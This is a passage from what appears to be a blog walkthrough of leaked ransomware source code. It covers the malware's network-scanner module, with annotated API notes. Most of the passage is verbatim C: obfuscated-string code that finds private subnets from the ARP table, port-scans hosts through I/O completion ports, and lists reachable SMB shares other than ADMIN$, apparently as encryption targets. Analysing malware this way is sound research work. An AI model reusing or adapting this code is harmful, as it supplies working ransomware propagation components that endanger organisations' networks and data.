RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote);</span><br><span class="line">	<span class="built_in">free</span>(DecryptNotePlainText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="networkscanner"><a href="#networkscanner" class="headerlink" title="networkscanner"></a>networkscanner</h2><h3 id="networkscanner-1"><a href="#networkscanner-1" class="headerlink" title="networkscanner"></a>networkscanner</h3><p>complex network scanner code.</p>
<ul>
<li><p>PortScanHandler</p>
<ul>
<li>pGetQueuedCompletionStatus</li>
<li>pPostQueuedCompletionStatus<ul>
<li>START_COMPLETION_KEY</li>
<li>CONNECT_COMPLETION_KEY</li>
<li>TIMER_COMPLETION_KEY</li>
</ul>
</li>
<li>CancelIo<ul>
<li>Cancels all pending input and output (I&#x2F;O) operations that are issued by the calling thread for the specified file. The function does not cancel I&#x2F;O operations that other threads issue for a file handle.</li>
</ul>
</li>
<li>shutdown<ul>
<li>The <strong>shutdown</strong> function disables sends or receives on a socket.</li>
</ul>
</li>
</ul>
</li>
<li><p>TimerCallback</p>
<ul>
<li><pre><code class="c">  if (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, NULL, 30000, 0, 0)) &#123;
                  pExitThread(EXIT_FAILURE);
  &#125;
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- a callback function that used with PostQueuedCompletionStatus. </span><br><span class="line"></span><br><span class="line">- ```c</span><br><span class="line">    BOOL CreateTimerQueueTimer(</span><br><span class="line">      [out]          PHANDLE             phNewTimer,</span><br><span class="line">      [in, optional] HANDLE              TimerQueue,</span><br><span class="line">      [in]           WAITORTIMERCALLBACK Callback,</span><br><span class="line">      [in, optional] PVOID               Parameter,</span><br><span class="line">      [in]           DWORD               DueTime,</span><br><span class="line">      [in]           DWORD               Period,</span><br><span class="line">      [in]           ULONG               Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>The amount of time in milliseconds relative to the current time that must elapse before the timer is signaled for the first time.</p>
</li>
<li><p>so 30000 &#x2F; 1000 &#x3D; 30s, one call to the Callback function(TimerCallback),if connection is set then CancelIo it .if not ,then shutdown and close the socket</p>
</li>
</ul>
</li>
</ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (CompletionStatus == TIMER_COMPLETION_KEY) &#123;</span><br><span class="line"></span><br><span class="line">			IsTimerActivated = TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (g_ActiveOperations) &#123;</span><br><span class="line"></span><br><span class="line">				PCONNECT_CONTEXT ConnectCtx = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(ConnectCtx, &amp;g_ConnectionList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ConnectCtx-&gt;State == CONNECTING) &#123;</span><br><span class="line">						pCancelIo((HANDLE)ConnectCtx-&gt;s);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">while</span> (!TAILQ_EMPTY(&amp;g_ConnectionList)) &#123;</span><br><span class="line"></span><br><span class="line">					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&amp;g_ConnectionList);</span><br><span class="line">					pshutdown(ConnectCtx-&gt;s, SD_SEND);</span><br><span class="line">					pclosesocket(ConnectCtx-&gt;s);</span><br><span class="line">					TAILQ_REMOVE(&amp;g_ConnectionList, ConnectCtx, Entries);</span><br><span class="line">					pGlobalFree(ConnectCtx);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!CreateHostTable()) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				ScanHosts();</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!pCreateTimerQueueTimer(&amp;hTimer, hTimerQueue, &amp;TimerCallback, <span class="literal">NULL</span>, <span class="number">30000</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">					pExitThread(EXIT_FAILURE);</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				IsTimerActivated = FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="EnumShares"><a href="#EnumShares" class="headerlink" title="EnumShares"></a>EnumShares</h4><ul>
<li><p>NetShareEnum</p>
<ul>
<li>Retrieves information about each shared resource on a server.</li>
</ul>
</li>
<li><p>sharepath</p>
<table>
<thead>
<tr>
<th align="left">Constant&#x2F;value</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">STYPE_DISKTREE0x00000000</td>
<td align="left">Disk drive</td>
</tr>
<tr>
<td align="left">STYPE_SPECIAL0x80000000</td>
<td align="left">Special share reserved for interprocess communication (IPC$) or remote administration of the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_434b0234-e970-4e8c-bdfa-e16a30d96703">server</a> (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.</td>
</tr>
<tr>
<td align="left">STYPE_TEMPORARY0x40000000</td>
<td align="left">A temporary share that is not persisted for creation each time the file server initializes.</td>
</tr>
</tbody></table>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">VOID</span><br><span class="line"><span class="title function_">network_scanner::EnumShares</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in PWCHAR pwszIpAddress, </span></span><br><span class="line"><span class="params">	__out PSHARE_LIST ShareList</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	NET_API_STATUS Result;</span><br><span class="line">	LPSHARE_INFO_1 ShareInfoBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD er = <span class="number">0</span>, tr = <span class="number">0</span>, resume = <span class="number">0</span>;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		Result = (NET_API_STATUS)pNetShareEnum(pwszIpAddress, <span class="number">1</span>, (LPBYTE*)&amp;ShareInfoBuffer, MAX_PREFERRED_LENGTH, &amp;er, &amp;tr, &amp;resume);</span><br><span class="line">		<span class="keyword">if</span> (Result == ERROR_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (DWORD i = <span class="number">1</span>; i &lt;= er; i++)</span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (TempShareInfo-&gt;shi1_type == STYPE_DISKTREE	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_SPECIAL	||</span><br><span class="line">					TempShareInfo-&gt;shi1_type == STYPE_TEMPORARY) </span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					PSHARE_INFO ShareInfo = (PSHARE_INFO)m_malloc(<span class="keyword">sizeof</span>(SHARE_INFO));</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">if</span> (ShareInfo &amp;&amp; plstrcmpiW(TempShareInfo-&gt;shi1_netname, OBFW(<span class="string">L&quot;ADMIN$&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">						plstrcpyW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, pwszIpAddress);</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, OBFW(<span class="string">L&quot;\\&quot;</span>));</span><br><span class="line">						plstrcatW(ShareInfo-&gt;wszSharePath, TempShareInfo-&gt;shi1_netname);</span><br><span class="line"></span><br><span class="line">						logs::Write(OBFW(<span class="string">L&quot;Found share %s.&quot;</span>), ShareInfo-&gt;wszSharePath);</span><br><span class="line">						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				TempShareInfo++;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			pNetApiBufferFree(ShareInfoBuffer);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (Result == ERROR_MORE_DATA);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="StartScan"><a href="#StartScan" class="headerlink" title="StartScan"></a>StartScan</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">network_scanner::StartScan()</span><br><span class="line">&#123;</span><br><span class="line">	WSADATA WsaData;</span><br><span class="line">	HANDLE hHostHandler = <span class="literal">NULL</span>, hPortScan = <span class="literal">NULL</span>;</span><br><span class="line">	PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	g_ActiveOperations = <span class="number">0</span>;</span><br><span class="line">	pWSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;WsaData);</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CriticalSection);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetConnectEX()) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get ConnectEx.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	GetCurrentIpAddress();</span><br><span class="line">	</span><br><span class="line">	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create io completion port.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TAILQ_INIT(&amp;g_SubnetList);</span><br><span class="line">	TAILQ_INIT(&amp;g_HostList);</span><br><span class="line">	TAILQ_INIT(&amp;g_ConnectionList);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetSubnets(&amp;g_SubnetList)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t get subnets.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hHostHandler = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;HostHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create host thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hPortScan = pCreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;PortScanHandler, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hPortScan == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t create port scan thread.&quot;</span>));</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pPostQueuedCompletionStatus(g_IocpHandle, <span class="number">0</span>, START_COMPLETION_KEY, <span class="literal">NULL</span>);</span><br><span class="line">	pWaitForSingleObject(hPortScan, INFINITE);</span><br><span class="line"></span><br><span class="line">	AddHost(STOP_MARKER);</span><br><span class="line">	pWaitForSingleObject(hHostHandler, INFINITE);</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	pDeleteCriticalSection(&amp;g_CriticalSection);</span><br><span class="line">	<span class="keyword">if</span> (g_IocpHandle) &#123;</span><br><span class="line">		pCloseHandle(g_IocpHandle);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hHostHandler) &#123;</span><br><span class="line">		pCloseHandle(hHostHandler);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (hPortScan) &#123;</span><br><span class="line">		pCloseHandle(hPortScan);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pWSACleanup();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="GetCurrentIpAddress"><a href="#GetCurrentIpAddress" class="headerlink" title="GetCurrentIpAddress"></a>GetCurrentIpAddress</h4><ul>
<li><p>pgethostname</p>
<ul>
<li><p>SOCKET_ERROR &#x3D;&#x3D; (INT)pgethostname(szHostName, 256)</p>
</li>
<li><p>g_HostEntry &#x3D; (struct hostent*)pgethostbyname(szHostName);</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>If no error occurs, <strong>gethostname</strong> returns zero. Otherwise, </p>
<p>it returns SOCKET_ERROR and a specific error code can be retrieved by calling <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsagetlasterror">WSAGetLastError</a>.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">DWORD <span class="title function_">GetCurrentIpAddress</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	CHAR szHostName[<span class="number">256</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">InAddr</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == (INT)pgethostname(szHostName, <span class="number">256</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_HostEntry = (<span class="keyword">struct</span> hostent*)pgethostbyname(szHostName);</span><br><span class="line">	<span class="keyword">if</span> (!g_HostEntry) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetConnectEX"><a href="#GetConnectEX" class="headerlink" title="GetConnectEX"></a>GetConnectEX</h4><ul>
<li>WSASocketW<ul>
<li>creates a socket that is bound to a specific transport-service provider</li>
</ul>
</li>
<li>WSAIoctl<ul>
<li>controls the mode of a socket.</li>
</ul>
</li>
<li>closesocket</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">GetConnectEX</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwBytes;</span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	SOCKET sock = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (sock == INVALID_SOCKET)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	GUID guid = WSAID_CONNECTEX;</span><br><span class="line">	rc = (<span class="type">int</span>)pWSAIoctl(sock, SIO_GET_EXTENSION_FUNCTION_POINTER,</span><br><span class="line">		&amp;guid, <span class="keyword">sizeof</span>(guid),</span><br><span class="line">		&amp;g_ConnectEx, <span class="keyword">sizeof</span>(g_ConnectEx),</span><br><span class="line">		&amp;dwBytes, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	rc =(<span class="type">int</span>) pclosesocket(sock);</span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetSubnets"><a href="#GetSubnets" class="headerlink" title="GetSubnets"></a>GetSubnets</h4><ul>
<li>GetIpNetTable<ul>
<li>GetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the table size)</li>
<li>ULONG Result &#x3D; (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);(to get the result)</li>
<li>The <strong>GetIfTable</strong> function retrieves the MIB-II interface table.</li>
</ul>
</li>
</ul>
<p>if the ip is start with “172.”,”192.168.”,”10.”,”169.”, there are subnets in this host.</p>
<p>And check if the subnet is already in the SubnetList . If not , add this SubnetInfo into SubnetList</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">	IpNetTable = (PMIB_IPNETTABLE)m_malloc(TableSize);</span><br><span class="line">	<span class="keyword">if</span> (!IpNetTable) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ULONG Result = (ULONG)pGetIpNetTable(IpNetTable, &amp;TableSize, FALSE);</span><br><span class="line">	<span class="keyword">if</span> (Result != ERROR_SUCCESS) &#123;</span><br><span class="line">		</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;GetIpNetTable fails. GetLastError = %lu&quot;</span>), pGetLastError());</span><br><span class="line">		<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IpNetTable-&gt;dwNumEntries; i++) &#123;</span><br><span class="line"></span><br><span class="line">		WCHAR wszIpAddress[INET_ADDRSTRLEN];</span><br><span class="line">		ULONG dwAddress = IpNetTable-&gt;table[i].dwAddr;	</span><br><span class="line">		PUCHAR HardwareAddres = IpNetTable-&gt;table[i].bPhysAddr;</span><br><span class="line">		ULONG HardwareAddressSize = IpNetTable-&gt;table[i].dwPhysAddrLen;</span><br><span class="line">		</span><br><span class="line">		RtlSecureZeroMemory(wszIpAddress, <span class="keyword">sizeof</span>(wszIpAddress));</span><br><span class="line"></span><br><span class="line">		IN_ADDR InAddr;</span><br><span class="line">		InAddr.S_un.S_addr = dwAddress;</span><br><span class="line">		PCHAR szIpAddress = pinet_ntoa(InAddr);</span><br><span class="line">		DWORD le = WSAGetLastError();</span><br><span class="line"></span><br><span class="line">		PCSTR p1 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;172.&quot;</span>));</span><br><span class="line">		PCSTR p2 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;192.168.&quot;</span>));</span><br><span class="line">		PCSTR p3 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;10.&quot;</span>));</span><br><span class="line">		PCSTR p4 = (PCSTR)pStrStrIA(szIpAddress, OBFA(<span class="string">&quot;169.&quot;</span>));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (p1 == szIpAddress ||</span><br><span class="line">			p2 == szIpAddress ||</span><br><span class="line">			p3 == szIpAddress ||</span><br><span class="line">			p4 == szIpAddress)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			BOOL Found = FALSE;</span><br><span class="line"></span><br><span class="line">			PSUBNET_INFO SubnetInfo = <span class="literal">NULL</span>;</span><br><span class="line">			TAILQ_FOREACH(SubnetInfo, SubnetList, Entries) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (!<span class="built_in">memcmp</span>(&amp;SubnetInfo-&gt;dwAddress, &amp;dwAddress, <span class="number">3</span>)) &#123;</span><br><span class="line"></span><br><span class="line">					Found = TRUE;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span> (!Found) &#123;</span><br><span class="line"></span><br><span class="line">				BYTE bAddres[<span class="number">4</span>];</span><br><span class="line">				*(ULONG*)bAddres = dwAddress;</span><br><span class="line">				bAddres[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">				PSUBNET_INFO NewSubnet = (PSUBNET_INFO)m_malloc(<span class="keyword">sizeof</span>(SUBNET_INFO));</span><br><span class="line">				<span class="keyword">if</span> (!NewSubnet) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				RtlCopyMemory(&amp;NewSubnet-&gt;dwAddress, bAddres, <span class="number">4</span>);</span><br><span class="line">				TAILQ_INSERT_TAIL(SubnetList, NewSubnet, Entries);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(IpNetTable);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="HostHandler"><a href="#HostHandler" class="headerlink" title="HostHandler"></a>HostHandler</h4><ul>
<li><p><code>pEnterCriticalSection(&amp;g_CriticalSection);</code></p>
<ul>
<li><p>When more than one processes access a same code segment that segment is known as critical section. Critical section contains shared variables or resources which are needed to be synchronized to maintain consistency of data variable.<a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/g-fact-70/">Critical Section in Synchronization</a></p>
<ul>
<li><p>&#96;&#96;&#96;c<br>  pEnterCriticalSection(&amp;g_CriticalSection);</p>
<p>  PHOST_INFO HostInfo &#x3D; TAILQ_FIRST(&amp;g_HostList);<br>  if (HostInfo &#x3D;&#x3D; NULL) {<br>  pLeaveCriticalSection(&amp;g_CriticalSection);<br>  pSleep(1000);<br>  continue;<br>      }<br>  TAILQ_REMOVE(&amp;g_HostList, HostInfo, Entries);<br>  pLeaveCriticalSection(&amp;g_CriticalSection);</p>
